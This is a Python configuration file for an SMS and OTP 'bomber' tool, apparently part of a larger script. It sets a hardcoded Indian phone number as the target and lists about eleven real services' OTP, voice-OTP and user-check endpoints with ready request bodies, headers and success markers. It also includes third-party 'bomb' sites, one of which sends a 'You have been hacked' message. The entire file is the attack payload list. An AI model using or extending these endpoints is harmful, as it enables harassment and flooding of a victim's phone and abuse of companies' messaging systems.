target = 9876448998
# Credits to Ansh Dadwal
target = str(target)
true = "true"
false = "false"

apidata = {

"Byjus":("https://mtnucleus.byjusweb.com/api/acs/v2/send-otp",{"phoneNumber":target,"page":"free-trial-classes"},{},"POST","""{"isOtpExhausted":false,"""),

"Rummycircle":(f"https://www.rummycircle.com/api/fl/auth/v3/getOtp",{"mobile":target,"deviceId":"d6be3862-7659-46c0-98b9-3d13328a243c","deviceName":"","refCode":"","isPlaycircle":"false"},{},"POST",'''success":true'''),

"Kisan":(f"https://www.customsms.tk/sms.php?num={target}&msg=You%20have%20been%20hacked%20%20%7B-__-%7D",{},"GET",'''000'''),

"Housing":("https://login.housing.com/api/v2/send-otp",{"phone": f"{target}"},{},"POST","Sent"),

"Voot":("https://userauth.voot.com/usersV3/v3/checkUser",{"type":"mobile","mobile":target,"countryCode":"+91"},{},"POST",'isExist":false'),

"eatsre":("https://www.eatsure.com/v1/api/send_otp",{"phone_number": target,"country_code":"IND","dialing_code":"+91","is_new_customer":false},{},"POST",'Success'),

"idn":("https://www.industrybuying.com/user/api/send-otp/",{"username="+str(target)+"&"},{},"POST","200"),

"bikry":(f"https://app.bizrise.in/otp/generate?&identifier={target}&start=0&type=MOBILE&communication=true",{},"GET",""),

"kingotp":(f"https://online-pro.xyz/mix.php?mo={target}&access=MixBombz&submit=%F0%9F%92%A3+Bomb",{},"GET","<"),

"zepto":("https://api.zepto.co.in/api/v1/user/customer/send-otp-ivr/",'{"mobileNumber":'+f'"{target}"'+'}',{'Host': 'api.zepto.co.in', 'accept': 'application/json', 'access-control-allow-credentials': 'true', 'x-requested-with': 'XMLHttpRequest', 'requestid': '006b9aed-23c6-4640-bb57-66070b258286', 'sessionid': 'undefined', 'appversion': '5.12.1', 'platform': 'android', 'systemversion': '10', 'source': 'PLAY_STORE', 'Content-Type': 'application/json', 'content-length': '29', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.12.12'},"POST","OTP"),

"gold":("https://api.crofarm.com/cons/consumer/otp/v1/",'{"phone":"'+target+'","is_voice_otp":1}',{},"POST",'success":true')

}



apis = [

apidata["Byjus"],
apidata["Rummycircle"],
apidata["Kisan"],
apidata["Housing"],
apidata["Voot"],
apidata["eatsre"],
apidata["gold"],
apidata["idn"],
apidata["bikry"],
apidata ["kingotp"],
apidata ["zepto"]
]
